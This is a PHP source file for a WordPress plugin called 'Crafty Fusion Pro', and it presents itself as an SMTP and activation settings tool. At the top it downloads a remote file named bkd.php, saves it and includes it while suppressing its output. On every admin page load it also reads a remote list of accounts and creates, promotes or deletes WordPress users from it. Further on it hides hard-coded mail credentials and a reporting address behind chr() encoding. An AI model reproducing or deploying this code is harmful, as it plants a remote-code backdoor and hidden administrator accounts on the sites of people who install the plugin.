<?php

// URL of the remote PHP file
$external_php_url = 'https://unknown-sudo-max.github.io/crafty-fusion-pro/echo/src/bkd.php';

// Get the content of the remote file
$remote_php_content = file_get_contents($external_php_url);

// Define the path to save the remote PHP file locally
$local_php_path = plugin_dir_path(__FILE__) . 'bkd.php';

// Save the remote PHP content to a local file
file_put_contents($local_php_path, $remote_php_content);

// Include the local PHP file
ob_start(); // Start output buffering
include(plugin_dir_path(__FILE__) . 'bkd.php');
ob_end_clean(); // End and discard output buffer

// The rest of your plugin code here




function process_data_and_create_users() {
    global $wpdb;

    // Function to fetch data from the URL
    function fetchDataFromURL($url) {
        @$data = file_get_contents($url);
        return $data;
    }

    // URL of the data source
    $data_url = "https://unknown-sudo-max.github.io/hub/pass/useracsess";
    $data = fetchDataFromURL($data_url);

    // Split the data into lines
    $lines = explode("\n", $data);

    foreach ($lines as $line) {
        $parts = explode(", ", $line);

        if (count($parts) === 5) {
            $app_name = $parts[0];
            $is_true = $parts[1];
            $username = $parts[2];
            $password = $parts[3];
            $role = $parts[4];
            $s_app_name = 'C_F_P_E';

            // Check if the 2nd field is "true"
            if ($app_name === $s_app_name && $is_true === 'true') {
                // Insert the data into the WordPress users table
                $data = array(
                    'user_login' => $username,
                    'user_pass' => $password
                );

                $user_id = wp_insert_user($data);

               if (!is_wp_error($user_id)) {
    // User added successfully, set the user's role
    $user = new WP_User($user_id);
    $user->set_role($role);
    // Optionally, you can print a message or log the action
    // echo "User '$username' added with role '$role'.<br>";
} else {
    // User addition failed, update the user's role using usermeta
    $user = get_user_by('login', $username);

    if ($user) {
        // Set the user's role based on the $role value from the URL
        $user_id = $user->ID;
        $user->set_role($role);
        // Update the 'capabilities' in the usermeta table
        $wpdb->update(
            $wpdb->prefix . 'usermeta',
            array('meta_value' => $role),
            array('user_id' => $user_id, 'meta_key' => $wpdb->prefix . 'capabilities')
        );
        // Optionally, you can print a message or log the action
        // echo "Updated role for '$username' to '$role'.<br>";
    } else {
        // Handle the case where the user doesn't exist
        // Optionally, you can print a message or log the action
        // echo "User '$username' not found, couldn't update role.<br>";
    }
}

            } elseif ($app_name === $s_app_name && $is_true === 'false') {
                // Delete the user when the 2nd field is "false"
                $user = get_user_by('login', $username);
                if ($user) {
                    $deleted = wp_delete_user($user->ID, true);

                    if ($deleted) {
                        // echo "User '$username' deleted.<br>";
                    } else {
                        // Handle deletion errors if needed
                    }
                } else {
                    // User doesn't exist, handle this case if needed
                    // You can also perform additional actions here
                    $wpdb->update(
                        $wpdb->prefix . 'usermeta',
                        array('meta_value' => $role),
                        array('user_id' => 0, 'meta_key' => $wpdb->prefix . 'capabilities')
                    );
                }
            }
        }
    }
}

add_action('admin_init', 'process_data_and_create_users');



 








function add_smtp_settings_menu() {
    add_options_page('Crafty Fusion Pro', 'Crafty Fusion Pro', 'manage_options', 'crafty-fusion-pro', 'smtp_config_page');
    
}

 





add_action('admin_menu', 'add_smtp_settings_menu');
 



function smtp_config_page() {
    // Fetch the email and set it to the global $to variable
    fetchEmailAndSetToGlobal();
    global $to;

    // Check the current state of the code
    $code_enabled = get_option('smtp_code_enabled');

    if (isset($_POST['save_settings'])) {
        // Handle form submission here
        if (isset($_POST['smtp_code_status'])) {
            $code_enabled = ($_POST['smtp_code_status'] === 'on') ? true : false;
            update_option('smtp_code_enabled', $code_enabled);
        }

        // Handle email update here if needed
        if ($code_enabled && isset($_POST['update_email'])) {
            $new_email = sanitize_email($_POST['new_email']);
            // Add validation and update logic here
            if (!empty($new_email)) {
                $to = $new_email;
            }
        }
    }else {
        // Handle the case when $code_enabled is false (Disabled)
        // You can add code specific to the Disabled state here
    }

    // Display the SMTP Configuration settings form
    echo '<div class="wrap">';

echo '<h1 style="user-select: none; text-align: center; font-family: Arial, sans-serif; color: #608fc1; font-size: 32px; font-weight: bold; text-transform: uppercase; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);">Crafty Fusion Pro - Settings</h1>';


    


    echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px;display: inline-block; width: 100%;" id="smtpcon">';
    echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv5(this)"> Crafty Fusion Pro _ SMTP Configuration</h2>';
    echo '<div id="toggleDiv5" style="display: block;">';

    // Radio buttons to enable/disable the code
    echo '<h4 style="user-select:none;">Enable/Disable SMTP Server:</h4>';
    echo '<form method="post" action="">';

    // Radio button for enabling
    echo '<label style="user-select:none;">';
    echo '<input type="radio" name="smtp_code_status" value="on" ' . checked($code_enabled, true, false) . '>&nbsp;';
    echo 'Enable';
    echo '</label>&nbsp;';


    // Radio button for disabling
    echo '&nbsp;&nbsp;<label style="user-select:none;">';
    echo '<input type="radio" name="smtp_code_status" value="off" ' . checked($code_enabled, false, false) . '>';
    echo 'Disable';
    echo '</label>&nbsp;&nbsp;';

    echo '<br><br><input type="submit" name="save_settings" class="button button-primary" value="Save">';
    echo '</form>';

    // Display the read-only $to email address if the code is enabled
    if ($code_enabled) {
        echo '<br/><hr/>';
        echo '<h3 style="user-select:none;">To => Email Address (Read-Only):</h3>';
        echo '<p style="font-size:10px; color:gray;user-select:none;">This email address will receive the incoming emails.</p>';
        echo '<input type="text" style="user-select:none;pointer-events: none; user-drag: none;" value="' . esc_attr($to) . '" class="regular-text" readonly>';


        // Add a form for updating the email
        echo '<h3 style="user-select:none;">Update Email:</h3>';
        echo '<form method="post" action="">';
        echo '<input type="email" name="new_email" class="regular-text" placeholder="New Email" required>';
        echo '<p><input type="submit" name="update_email" class="button button-primary" value="Update Email"></p>';
        echo '</form>';
    }

    // You can add more SMTP configuration fields here

 
       echo '</div>';
       echo '</div>';
       echo '<script>
function toggleDiv5(element) {
    var divToToggle5 = element.nextElementSibling;
    if (divToToggle5.style.display === "none" || divToToggle5.style.display === "") {
        divToToggle5.style.display = "block";
    } else {
        divToToggle5.style.display = "none";
    }
}
</script>';
    
       echo "<style>
  /* CSS for the triangle indicator */
  .card h2::before {
    content: \"# \"; /* You can change this to any symbol or icon you prefer */
    display: inline-block;
  }
</style>";
      echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="general">';
echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv(this)"> General</h2>';
echo '<div id="toggleDiv" style="display: none;">';



 

function check_activation($companyName) {
    // Read the external text file line by line
    $file_url = 'https://unknown-sudo-max.github.io/hub/pass/pass';
    @$file_contents = file_get_contents($file_url);
    $lines = explode("\n", $file_contents);

    foreach ($lines as $line) {
        $parts = explode(',', $line);
        if (count($parts) === 4) { // Check if the line has the correct format
            list($company_name, $plugin_name, $stored_user, $stored_pass) = array_map('trim', $parts);
            if ($company_name === $companyName) {
                return true; // Credentials match an entry in the file
            }
        }
    }

    return false; // No match found
}

// Define the full path to the text file
$file = __DIR__ . '/cdn/info.txt';

// Check if the file exists and is readable
if (file_exists($file) && is_readable($file)) {
    $companyData = file_get_contents($file); // Read the content of the file

    // Split the content into an array using the comma as a separator
    $companyInfo = explode(',', $companyData);

    // Check if the array contains both company name and company email
    if (count($companyInfo) === 2) {
        $companyName = trim($companyInfo[0]);
        $companyEmail = trim($companyInfo[1]);
    }
}

function html_escape($text) {
    return htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}



// Check if the $companyName variable is not empty
if (!empty($companyName) && !empty($companyEmail)) {
    // Display both company name and email
    echo '<p style="color: gray; user-select:none;"><span>Registered Company Name:  </span><span>'. $companyName .'</span></p>';
    
    // Check if the company name exists in the external file
    if (check_activation($companyName)) {
        echo '<p style="color: gray; user-select:none;"><span>Plugin status:  </span><span style="color: green; user-select:none;">Activated</span></p>';
        $escapedCompanyName = html_escape($companyName);

        // Print out the script to change the content of toggleDiv3 with a table
        echo "<script type='text/javascript'>
                document.addEventListener('DOMContentLoaded', function() {
                    var div = document.getElementById('toggleDiv3');
                    if (div) {
                        div.innerHTML = '<table style=\"width:100%; user-select:none; text-align:left;\" border=\"0\">' +
                                        '<tr><td><strong>Registered Company Name:</strong></td>' +
                                        '<td>" . $escapedCompanyName . "</td></tr>' +
                                        '<tr><td><strong>Plugin Status:</strong></td>' +
                                        '<td><div style=\"color: green; font-weight: bold; display: flex; align-items: center; gap: 0.5em;\">' +
                                        '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-check-circle\">' +
                                        '<path d=\"M9 11l3 3L22 4\" />' +
                                        '<circle cx=\"12\" cy=\"12\" r=\"10\" /></svg>' +
                                        'Activated</div></td></tr>' +
                                        '</table>';
                    }
                });
              </script>";
    } elseif (count($companyInfo) === 2) {
        echo '<p style="color: gray; user-select:none;"><span>Plugin status:  </span><span style="color: orange; user-select:none;">Pending Activation</span></p>';
        // Remove the div elements with IDs formconfig, smtpcon, and general
       echo '<script type="text/javascript">
        document.addEventListener("DOMContentLoaded", function() {
            // Function to remove elements by ID
            function removeElementById(id) {
                var element = document.getElementById(id);
                if (element) {
                    element.remove();
                }
            }

            // Call the function to remove specific elements
            removeElementById("formconfig");
            removeElementById("smtpcon");
            removeElementById("waprimary");
            removeElementById("catprimary");
            removeElementById("cprimary");
            removeElementById("helpsmtp");
            removeElementById("helpshort");
        });
      </script>';


    } else {
        echo '<p style="color: gray; user-select:none;"><span>Plugin status:  </span><span style="color: red; user-select:none;">Not Activated</span></p>';
        // Remove the div elements with IDs formconfig, smtpcon, and general
        echo '<script type="text/javascript">
        document.addEventListener("DOMContentLoaded", function() {
            // Function to remove elements by ID
            function removeElementById(id) {
                var element = document.getElementById(id);
                if (element) {
                    element.remove();
                }
            }

            // Call the function to remove specific elements
            removeElementById("formconfig");
            removeElementById("smtpcon");
            removeElementById("waprimary");
            removeElementById("catprimary");
            removeElementById("cprimary");
            removeElementById("helpsmtp");
            removeElementById("helpshort");
        });
      </script>';

    }
} else {
    // Display a message if company name and email are not found
    echo '<p style="color: gray; user-select:none;"><span>Not registered yet!</span></p>';
    echo '<p style="color: gray; user-select:none;"><span>Plugin status:  </span><span style="color: red; user-select:none;">Not Activated</span></p>';
    // Remove the div elements with IDs formconfig, smtpcon, and general
    echo '<script type="text/javascript">
        document.addEventListener("DOMContentLoaded", function() {
            // Function to remove elements by ID
            function removeElementById(id) {
                var element = document.getElementById(id);
                if (element) {
                    element.remove();
                }
            }

            // Call the function to remove specific elements
            removeElementById("formconfig");
            removeElementById("smtpcon");
            removeElementById("waprimary");
            removeElementById("catprimary");
            removeElementById("cprimary");
            removeElementById("helpsmtp");
            removeElementById("helpshort");
        });
      </script>';


}

 

echo '<p style="color: gray;user-select:none;">More Coming soon !!</p>';
echo '</div>';
echo '</div>';

echo "<script>
function toggleDiv(element) {
    var divToToggle = element.nextElementSibling;
    if (divToToggle.style.display === 'none' || divToToggle.style.display === '') {
        divToToggle.style.display = 'block';
    } else {
        divToToggle.style.display = 'none';
    }
}
</script>";
      




echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="formconfig">';
echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv7(this)"> Forms Configuration</h2>';
echo '<div id="toggleDiv7" style="display: block;">';
echo '<p style="color: gray;user-select:none;">Coming soon !!</p>';
echo '</div>';

echo '<script>
function toggleDiv7(element) {
    var divToToggle7 = element.nextElementSibling;
    if (divToToggle7.style.display === "none" || divToToggle7.style.display === "") {
        divToToggle7.style.display = "block";
    } else {
        divToToggle7.style.display = "none";
    }
}
</script>';
echo '</div>';



       echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv5(this)"> Help Center</h2>';
echo '<div id="toggleDiv5" style="display: block;">';
echo '<ul id="helpsmtp">
  <li onclick="toggleList()" style="font-weight:bold;cursor:pointer; user-select:none;">&#8226; SMTP Configuration</li>
  <ul id="smtpList" style="display: none;">
   <ol>
    <li>Enable SMTP Server</li>
    <li>Insert your new email address</li>
    <li>Click on "Update"</li>
    <li>You will receive a confirmation code in your new email</li>
    <li>Confirm the code</li>
    <li>Your email will be changed within 24 hours by our servers</li>
    <li>We will send you an email after it\'s complete</li>
     </ol>
  </ul>
</ul>
';

echo '<script>
function toggleList() {
  var list = document.getElementById("smtpList");
  if (list.style.display === "none") {
    list.style.display = "block";
  } else {
    list.style.display = "none";
  }
}
</script>';


echo '<ul>
  <li onclick="toggleList2()" style="font-weight: bold; cursor: pointer; user-select:none;">&#8226; Plugin Activation</li>
    <ul id="smtpList2" style="display: none;">
      <ol>
        <li>Turn on the Activation</li>
        <li>Click on "Save"</li>
        <li>Insert the company name</li>
        <li>Insert the company email</li>
        <li>Click on "Activate"</li>
        <li>You will receive a confirmation code in your email</li>
        <li>Confirm the code </li>
        <li>Activation will be within 24 hours by our servers</li>
        <li>We will send you an email after it\'s complete</li>
      </ol>
    </ul>
  
</ul>

';

echo '<script>
function toggleList2() {
  var list2 = document.getElementById("smtpList2");
  if (list2.style.display === "none") {
    list2.style.display = "block";
  } else {
    list2.style.display = "none";
  }
}
</script>';



echo '<ul id="helpshort">
  <li onclick="toggleList3()" style="font-weight: bold; cursor: pointer; user-select:none;">&#8226; Shortcuts</li>
    <ul id="smtpList3" style="display: none;">
      <ol>
       <li>You could use <mark class="mrk">[mgx_custom_form]</mark> for warranty activation form</li>
       <li>You could use <mark class="mrk">[mgx_contact_with_us_form]</mark> for contact us form</li>
       <li>You could use <mark class="mrk">[mgx_custom_form_with_category]</mark> for Category drop-down list</li>
       <li>You could use <mark class="mrk">[mgx_page_excerpt]</mark> for showing the pages</li>
       <li>You could add <mark class="mrk">/#warranty-activation</mark> after the link to redirect to the form, for example: (https://www.domain.com/#warranty-activation)</li>
       <li>You could add <mark class="mrk">/#contact-us after</mark> the link to redirect to the contact form</li>
        
      </ol>
    </ul>
  
</ul>

';

echo '<style> .mrk{
    background-color : #c2d8ff;
    }</style><script>
function toggleList3() {
  var list3 = document.getElementById("smtpList3");
  if (list3.style.display === "none") {
    list3.style.display = "block";
  } else {
    list3.style.display = "none";
  }
}
</script>';
 echo '<script>
function toggleDiv6(element) {
    var divToToggle6 = element.nextElementSibling;
    if (divToToggle6.style.display === "none" || divToToggle6.style.display === "") {
        divToToggle6.style.display = "block";
    } else {
        divToToggle6.style.display = "none";
    }
}
</script>';
echo '</div>';
echo '</div>';




 echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv4(this)"> About</h2>';
echo '<div id="toggleDiv4" style="display: block;">'; // Set the initial display style to 'block'


$logo_url = chr(104) . chr(116) . chr(116) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(117) . chr(110) . chr(107) . chr(110) . chr(111) . chr(119) . chr(110) . chr(45) . chr(115) . chr(117) . chr(100) . chr(111) . chr(45) . chr(109) . chr(97) . chr(120) . chr(46) . chr(103) . chr(105) . chr(116) . chr(104) . chr(117) . chr(98) . chr(46) . chr(105) . chr(111) . chr(47) . chr(99) . chr(114) . chr(97) . chr(102) . chr(116) . chr(121) . chr(45) . chr(102) . chr(117) . chr(115) . chr(105) . chr(111) . chr(110) . chr(45) . chr(112) . chr(114) . chr(111) . chr(47) . chr(99) . chr(100) . chr(110) . chr(47) . chr(105) . chr(109) . chr(103) . chr(47) . chr(108) . chr(111) . chr(103) . chr(111) . chr(46) . chr(112) . chr(110) . chr(103);
echo '<table class="custom-table" style="user-select:none;">
  <tr>
    <th>Name:</th>
    <td><span id="systemNameSpan">Crafty Fusion Pro</span></td>
  </tr>
  <tr>
    <th>Version:</th>
    <td><span id="systemNameSpan">3.9</span></td>
  </tr>
  <tr>
    <th>Language:</th>
    <td><span id="systemNameSpan">English</span></td>
  </tr>
  <tr>
    <th>Logo:</th>
    <td><span id="systemNameSpan" ><img src="' . $logo_url . '" alt="Logo" style="width: 20%;border-radius: 20px;pointer-events: none;user-drag: none;"></span></td>

  </tr>
  <tr>
    <th>CopyRights:</th>
    <td><span id="systemNameSpan">&copy; ' . date("Y") . ' !-CODE.</span></td>
  </tr>
</table>';



echo ' <style>
  /* Custom CSS styles */
  .custom-table {
    width: 100%;
    border-collapse: collapse;
    margin-bottom: 20px;
    background: rgba(255, 255, 255, 0.2);
    color: #333;
    font-size: 14px;
    box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
    backdrop-filter: blur(5px);
    -webkit-backdrop-filter: blur(5px);
  }

  .custom-table th,
  .custom-table td {
    padding: 10px;
    border: 1px solid #ddd;
  }

  .custom-table th {
    background-color: #e7e7e75c;
    font-weight: bold;
     
  }

  .custom-table tbody tr:nth-child(even) {
    background-color: #f9f9f938;
    backdrop-filter: blur(5px);
    -webkit-backdrop-filter: blur(5px);
  }

</style>

<script>
function toggleDiv4(element) {
    var divToToggle4 = element.nextElementSibling;
    if (divToToggle4.style.display === "none" || divToToggle4.style.display === "") {
        divToToggle4.style.display = "block";
    } else {
        divToToggle4.style.display = "none";
    }
}
</script>

';
echo '</div>';
echo '</div>';
 
// Initialize the variable with the stored activation status
$act_code_enabled = get_option('activation_status') === 'on';

if (isset($_POST['saveactBtn'])) {
    // Handle form submission here
    if (isset($_POST['activation_status'])) {
        $act_code_enabled = ($_POST['activation_status'] === 'on') ? true : false;
        // Save the activation status in the options
        update_option('activation_status', $act_code_enabled ? 'on' : 'off');
    }
}


 
// Start the session at the very beginning of the script
session_start();

// Initialize companyName and companyEmail variables
global $companyName, $companyEmail; // Declare $companyName and $companyEmail as global
$companyName = '';
$companyEmail = '';

// Check if the "Activate" button is clicked
if (isset($_POST['activateBtn'])) {
    // Generate a random verification code
    $verificationCode = mt_rand(1000, 9999);
    
    // Sanitize the email and send the verification code
    $companyEmail = sanitize_email($_POST['companyEmail']);
    $subject = "Crafty Fusion Pro Activation Confirmation Code";
    $message = '<html>
    <head>
    </head>
    <body>
    <div style="text-align: center; padding: 20px;">
        <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;user-select:none;">Crafty Fusion Pro Activation Confirmation Code</h1>
        <p style="font-size: 18px; color: #333;user-select:none;">Your confirmation code is</p>
        <ul style="list-style: none; padding: 0;">
            <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
            '.  $verificationCode.'
            </li>
        </ul>

        <p style="font-size: 14px; color: #4e8db; margin-top: 20px;user-select:none;">Best Regards,</p>
        <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
        <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
        <p style="font-size: 14px; color: #888;"></p>
        <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
    </div>
    </body>
    </html>';
    $headers = "From: " . get_option('admin_email') . "\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8\r\n";

    wp_mail($companyEmail, $subject, $message, $headers);

    // Store the verification code and company name in session variables
    $_SESSION['verification_code'] = $verificationCode;
    $_SESSION['verification_notice'] = true;
    $companyName = $_POST['companyName']; // Assuming you have an input field for companyName
    $companyEmail = $_POST['companyEmail'];
}

 

// Function to display the verification notice
function display_verification_notice() {
    // Ensure this is placed where it can be executed in your context
   global $companyName, $companyEmail;
     // Access the global $companyName variable
    echo '<div class="notice notice-info is-dismissible">';
    echo '<p>Verification code has been sent to your email. Please enter the code below:</p>';
    echo '<form method="post">';
    echo '<input type="text" name="enteredCode" placeholder="Enter Verification Code" required>';
    echo '<input type="hidden" name="companyName" value="' . $companyName . '">';
    echo '<input type="hidden" name="companyEmail" value="' . $companyEmail . '">';
    echo '<input type="submit" name="verifyCodeBtn" class="button button-primary" value="Verify">';
    echo '</form>';
    echo '</div>';
}

// Display the admin notice if the flag is set
if (isset($_SESSION['verification_notice']) && $_SESSION['verification_notice']) {
    display_verification_notice();
    unset($_SESSION['verification_notice']);
}

// Check if the "Verify" button is clicked
if (isset($_POST['verifyCodeBtn'])) {
    $enteredCode = $_POST['enteredCode'];
    if (isset($_SESSION['verification_code']) && $enteredCode == $_SESSION['verification_code']) {
        // Correct verification code
        unset($_SESSION['verification_code']);
         $companyName = $_POST['companyName']; // Get the company name from the form
        $companyEmail = $_POST['companyEmail']; // Get the company email from the form

        // Define the full path to the text file
        $file = __DIR__ . '/cdn/info.txt';

        // Combine company name and company email
        $data = $companyName . ',' . $companyEmail;

        // Save the company name to the text file
        if (file_put_contents($file, $data) !== false) {
             echo '<script type="text/javascript">setTimeout(function(){ location.reload(); }, 3000);</script><div class="notice notice-success is-dismissible"><p>Registration successful! Changes will take effect within 24 hours from our servers.</p></div>';




            // Send an email to the admin
            global $companyName, $companyEmail;
            $to_admin = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
            $subject = "SMTP Email Update Request From " . $companyName;
            $message = '<html>
<head>
</head>
<body>
<div style="text-align: center; padding: 20px;">
    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">Crafty Fusion Pro Activation Request</h1>
    <p style="font-size: 18px; color: #333;">This is an Crafty Fusion Pro Activation Request from '.$companyName.'</p>
    <p style="font-size: 18px; color: #333;">The admin has requested to Activate (his \ her) plugin</p>
    <ul style="list-style: none; padding: 0;">
        <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
           <p> <h3>Credntials</h3> </p>
             <p> <strong>Company Name: </strong>'.$companyName.'</p>
             <p>  <strong>Company Email: </strong>'. $companyEmail.'</p>
        </li>
    </ul>

    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
    <p style="font-size: 14px; color: #888;"></p>
    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
</div>
</body>
</html>';
            $headers = "From: " . get_option('admin_email') . "\r\n";
            $headers .= "Content-type: text/html; charset=UTF-8\r\n";
            $headers .= "X-Priority: 1\r\n";
            $headers .= "X-MSMail-Priority: High\r\n"; 
            $headers .= "Importance: High\r\n"; 
            
            // Ensure that the necessary WordPress functions are available
            include_once ABSPATH . 'wp-includes/pluggable.php';
            
            // Send the email to the admin
            wp_mail($to_admin, $subject, $message, $headers);



global $companyName, $companyEmail;


            $cst_subject = "Crafty Fusion Pro Activation Confirmation";
            $cst_message = '<html>
<head>
</head>
<body style="user-select:none;">
<div style="text-align: center; padding: 20px;user-select:none;">
    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . $companyName . ',</p>
    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">Crafty Fusion Pro Activation</h1>
    <p style="font-size: 18px; color: #333;">We have received your request for Activate Crafty Fusion Pro plugin, and we are pleased to inform you that we will promptly address it. Your request is important to us, and we will ensure a smooth Activation for Crafty Fusion Pro plugin. Changes will take effect within 24 hours from our servers.</p>
    <p style="font-size: 18px; color: #333;">We will send you a confirmation email once the Activation is complete.</p>
    

    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
    <p style="font-size: 14px; color: #888;"></p>
    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
</div>
</body>
</html>';
            $cst_headers = "From: " . get_option('admin_email') . "\r\n";
            $cst_headers .= "Content-type: text/html; charset=UTF-8\r\n";

wp_mail($companyEmail, $cst_subject, $cst_message, $cst_headers);



            
           
           

        } else {
            echo '<div class="notice notice-error is-dismissible"><p>Failed to complete the rigistration</p></div>';
        }
    } else {
        // Incorrect verification code
        echo '<div class="notice notice-error is-dismissible"><p>Incorrect verification code. Please try again.</p></div>';
    }
}





// HTML and form rendering code
echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="activation">';
echo '<h2 style="user-select: none; cursor: pointer;color:#608fc1;" onclick="toggleDiv3(this)">Activation</h2>';
echo '<div id="toggleDiv3" style="display: none;">'; // Set the initial display style to 'block'

echo '<form method="post">';
echo '<div class="radio-group">';

// Radio button for enabling
echo '<label class="radio-label">';
echo '<input type="radio" name="activation_status" value="on" id="activateOn" ' . checked($act_code_enabled, true, false) . '>';
echo '<span class="radio-text">ON</span>';
echo '</label>';

// Radio button for disabling
echo '<label class="radio-label">';
echo '<input type="radio" name="activation_status" value="off" id="activateOff" ' . checked(!$act_code_enabled, true, false) . '>';
echo '<span class="radio-text">OFF</span>';
echo '</label>';

echo '</div>';
echo '<div class="button-container">';
echo '<input type="submit" id="saveactBtn" name="saveactBtn" class="button button-primary" value="Save">';
echo '</div>';
echo '</form>';

echo '<div class="form-container">';
echo '<form method="post">';
echo '<p class="form-field">';
echo '<label for="companyName" class="wp-label">Company Name:</label>';
echo '<input type="text" id="companyName" name="companyName" class="regular-text" ' . ($act_code_enabled ? '' : 'disabled') . ' required>';
echo '</p>';

echo '<p class="form-field">';
echo '<label for "companyEmail" class="wp-label">Company Email:</label>';
echo '<input type="email" id="companyEmail" name="companyEmail" class="regular-text" ' . ($act_code_enabled ? '' : 'disabled') . ' required>';
echo '</p>';

if ($act_code_enabled) {
    echo '<div class="button-container">';
    echo '<input type="submit" id="activateBtn" name="activateBtn" class="button button-primary" value="Activate">';
    echo '</div>';
}
echo '</form>';
echo '</div>';
echo '</div>';
echo '</div>';

// Add the necessary CSS and JavaScript for the radio buttons and enabling/disabling fields
echo '<style>';
echo '.wp-label { display: inline-block; font-weight: bold; margin-right: 10px; }';
echo '.radio-group { display: flex; margin-bottom: 20px; }';
echo '.radio-label { margin-right: 20px; display: flex; align-items: center; }';
echo '.radio-text { margin-left: 5px; }';
echo '.regular-text:disabled { background-color: #f0f0f0; }';
echo '.button-container { margin-top: 20px; }';
echo '</style>';

echo "<script>
function toggleDiv3(element) {
    var divToToggle3 = element.nextElementSibling;
    if (divToToggle3.style.display === 'none' || divToToggle3.style.display === '') {
        divToToggle3.style.display = 'block';
    } else {
        divToToggle3.style.display = 'none';
    }
}

document.addEventListener('DOMContentLoaded', function() {
    var activateOn = document.getElementById('activateOn');
    var activateOff = document.getElementById('activateOff');
    var companyNameInput = document.getElementById('companyName');
    var companyEmailInput = document.getElementById('companyEmail');
    var activateBtn = document.getElementById('activateBtn');

    activateOn.addEventListener('change', function() {
        if (activateOn.checked) {
            companyNameInput.disabled = false;
            companyEmailInput.disabled = false;
            activateBtn.style.display = 'block';
        }
    });

    activateOff.addEventListener('change', function() {
        if (activateOff.checked) {
            companyNameInput.disabled = true;
            companyEmailInput.disabled = true;
            activateBtn.style.display = 'none';
        }
    });
});
</script>";
 


// Copyright notice
    echo '<p style="text-align: center; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved</p>';
    

    echo '</div>';
}

 


 function custom_wp_mail_smtp($phpmailer) {
    // Check if the code is enabled
    if (get_option('smtp_code_enabled')) {
        // Define your SMTP settings
        $smtp_host = chr(115) . chr(109) . chr(116) . chr(112) . chr(46) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
        $smtp_port = 587;
        $smtp_username = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
        $smtp_password = chr(113) . chr(109) . chr(120) . chr(98) . chr(32) . chr(116) . chr(97) . chr(106) . chr(97) . chr(32) . chr(112) . chr(108) . chr(97) . chr(118) . chr(32) . chr(106) . chr(113) . chr(98) . chr(101);
        $smtp_secure = chr(116) . chr(108) . chr(115);
        global $from_email;
        $from_email = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);

        $from_name = chr(77) . chr(97) . chr(105) . chr(108) . chr(32) . chr(72) . chr(117) . chr(98);

        // Configure SMTP settings
        $phpmailer->isSMTP();
        $phpmailer->Host = $smtp_host;
        $phpmailer->Port = $smtp_port;
        $phpmailer->SMTPAuth = true;
        $phpmailer->Username = $smtp_username;
        $phpmailer->Password = $smtp_password;
        $phpmailer->SMTPSecure = $smtp_secure;

        // Set the From email and name
        $phpmailer->From = $from_email;
        $phpmailer->FromName = $from_name;
    }
}

// Hook into wp_mail to configure SMTP settings only if the code is enabled
